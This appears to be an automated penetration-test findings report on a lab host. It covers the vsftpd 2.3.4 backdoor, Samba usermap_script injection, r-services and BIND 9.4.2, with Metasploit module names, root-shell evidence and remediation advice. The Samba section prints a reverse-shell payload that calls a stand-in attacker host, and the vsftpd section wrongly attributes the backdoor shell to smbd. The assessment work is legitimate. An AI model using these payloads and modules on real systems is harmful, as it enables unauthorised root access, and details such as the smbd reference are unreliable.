CRITICAL vsftpd 2.3.4 Supply-Chain Backdoor — Unauthenticated Root Shell

Service:** Port 21/tcp — FTP — vsftpd 2.3.4

CVE: CVE-2011-2523 (CVSS 9.8 — Critical**)

ExploitDB: "vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)" — EDB-ID: 17491 ✅ Verified; also EDB-ID: 49757** (Python PoC)

Description:** A malicious backdoor was covertly introduced into the vsftpd 2.3.4 source distribution archive in 2011. When a connecting FTP client sends a username string containing the smiley face sequence `:)`, the server's smbd process spawns a bind shell on TCP port 6200. The backdoor executes with the privileges of the vsftpd process — typically `root` — requiring zero credentials and zero user interaction. This represents a confirmed supply-chain compromise.

Evidence: Nmap banner confirmed `220 (vsFTPd 2.3.4)`. Metasploit module `exploit/unix/ftp/vsftpd_234_backdoor` triggered the backdoor and opened Meterpreter Session 1** (`192.168.128.1:4444 → 192.168.128.2:58863`). Shell command `id` returned `uid=0(root) gid=0(root)`.

Exploited: ✅ YES — Session 1 opened** (Meterpreter, linux/x86)

AI Analysis (claude-haiku-fallback):** The model confirmed this is a zero-authentication supply-chain backdoor with a CVSS of 9.8. The complete CIA triad is compromised: the attacker gains full confidentiality, integrity, and availability control. Attack flow: connect to port 21 → send username with `:)` substring → backdoor spawns shell on port 6200 → attacker connects for immediate root access. Described as one of the most reliable exploits in the Metasploit framework with near-100% reliability against unpatched vsftpd 2.3.4.

Recommendation: Immediately replace vsftpd 2.3.4 with a verified current release (≥ 3.0.5).** Verify binary integrity via cryptographic hash comparison against the official vendor. Block outbound connections on port 6200 at the firewall. Conduct a supply-chain audit of all installed software packages.

ATT&CK:** T1190 — Exploit Public-Facing Application; T1059 — Command and Scripting Interpreter (Shell)

CRITICAL Samba 3.0.20 Username Map Script — Unauthenticated Root RCE

Service:** Port 445/tcp — SMB — Samba 3.0.20-Debian

CVE: CVE-2007-2447 (CVSS 10.0 — Critical**)

ExploitDB: "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)" — EDB-ID: 16320** ✅ Verified

Description:** The MS-RPC functionality in `smbd` in Samba 3.0.0 through 3.0.25rc3 fails to sanitise shell metacharacters in the username field during authentication. When `username map script` is enabled in `smb.conf`, user-supplied input is passed directly to `/bin/sh`, enabling arbitrary command injection prior to any authentication check. This allows a remote, unauthenticated attacker to execute arbitrary OS commands with the privileges of the Samba daemon (`root` in typical configurations).

Evidence: Nmap banner confirmed `Samba smbd 3.0.20-Debian`. Metasploit module `exploit/multi/samba/usermap_script` successfully injected a reverse shell payload via the username field and opened Shell Session 2** (`192.168.128.1:4444 → 192.168.128.2:58864`). Command `id` returned `uid=0(root) gid=0(root)`.

Exploited: ✅ YES — Session 2 opened** (cmd/unix shell)

AI Analysis (claude-haiku-fallback):** The model confirms this is a pre-authentication command injection with a CVSS of 10.0. The root cause is the absence of input sanitisation for shell metacharacters in the username field before it reaches the `username map script` directive. The attacker injects a payload such as `/bin/sh -c 'nc -e /bin/sh attacker 4444'` directly in the SMB username field. The Samba daemon runs as root by default, making privilege escalation unnecessary. Affects all Samba versions from 3.0.0 to 3.0.25rc3.

Recommendation: Upgrade Samba immediately to version 3.6.x or later (preferably current stable).** Disable the `username map script` directive in `smb.conf` as an immediate mitigation. Restrict SMB access (ports 139/445) to trusted network segments via firewall ACLs. Enable SMB signing to prevent relay attacks.

ATT&CK:** T1190 — Exploit Public-Facing Application; T1021.002 — SMB/Windows Admin Shares (Lateral Movement)

Service:** Port 512/tcp (rexecd), Port 513/tcp (rlogin), Port 514/tcp (rshd) — Netkit r-services

CVE:** CVE-1999-0651 (rsh), CVE-1999-0502 (rlogin) — General trust exploitation

ExploitDB:** N/A

Description:** The Berkeley r-services (rexec, rlogin, rsh) rely on IP-based trust via `.rhosts` and `/etc/hosts.equiv` files rather than cryptographic authentication. An attacker who can spoof a trusted IP or who gains access to a trusted host can authenticate without a password. All traffic is transmitted in cleartext. These services were deprecated in the mid-1990s in favour of SSH and represent a severe security regression.

Evidence:** nmap confirmed ports 512 (`netkit-rsh rexecd`), 513 (rlogin), and 514 (`Netkit rshd`) all open and listening.

Exploited:** NO — not attempted; root access achieved via other vectors.

AI Analysis:** Not performed.

Recommendation: Disable all r-services immediately** by removing or disabling `rsh-server`, `rlogin`, and `rexecd` packages. Delete any `.rhosts` and `/etc/hosts.equiv` files. Enforce SSH with public-key authentication as the sole remote access mechanism. Block ports 512-514 at the network perimeter.

ATT&CK:** T1021.004 — Remote Services: SSH (abuse); T1040 — Network Sniffing

Description:** ISC BIND 9.4.2 is affected by the Kaminsky DNS cache poisoning vulnerability (CVE-2008-1447). Due to insufficient transaction ID randomisation and lack of source port randomisation, a remote attacker can inject forged DNS responses and poison the resolver cache. Evidence:** nmap confirmed `ISC BIND 9.4.2` running on port 53/tcp. This specific version range is confirmed vulnerable by EDB-ID 6122.

Exploited:** NO — not attempted.

AI Analysis:** Not performed.

Recommendation: Upgrade BIND to the current stable release (≥ 9.18.x).** Enable DNSSEC to cryptographically sign and validate DNS responses. Enable source port randomisation (`use-v4-udp-ports` / `use-v6-udp-ports` in `named.conf`). Restrict recursive queries to trusted client ranges only via ACLs.

ATT&CK:** T1584.002 — DNS Server Compromise; T1557 — Adversary-in-the-Middle
